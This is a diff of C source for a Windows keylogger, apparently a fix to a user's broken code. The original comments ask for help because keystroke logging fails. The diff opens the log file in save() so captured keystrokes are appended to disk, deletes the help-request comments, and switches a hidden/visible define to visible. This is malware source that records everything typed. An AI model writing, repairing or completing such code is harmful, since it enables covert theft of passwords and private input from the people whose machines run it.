@@ -1,5 +1,3 @@
-//I can't get the file output to work and I have no idea what's wrong everything looks like it's correct 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
@@ -7,7 +5,7 @@
 #include <string.h>
 #include <stdbool.h>
 
-#define hidden    //hidden/visible
+#define visible    //hidden/visible
 
 const char* keyname[] = {   //establish keynames
     [VK_BACK] = "[BACKSPACE]",
@@ -72,10 +70,10 @@ void ReleaseHook()
 }
 
 int save(int key_stroke) { //save to file
-    FILE* outputtext;
+    FILE* outputtext=fopen("log", "a");
     char output[1024];
     static char lastwindow[256] = "";
-	if ((key_stroke == 1) || (key_stroke == 2))      //ignore mouse clicks
+	if ((key_stroke == 1) || (key_stroke == 2))      //ignore clicks
     {
         return 0;
     }
@@ -119,8 +117,8 @@ int save(int key_stroke) { //save to file
         }
         sprintf_s(output, sizeof(output), "%c", key);
     }
-	fputs(output, outputtext); //says that outputtext is an undeclared identifier but it's declared in main and in this function, maybe it's because it's decalred twice? IDk why that 
-	fflush(outputtext);        //would be a problem but I'm not sure what else it could be. Please help me figure this out. 
+	fputs(output, outputtext);
+	fflush(outputtext);
     printf("%s", output);
     return 0;
 }
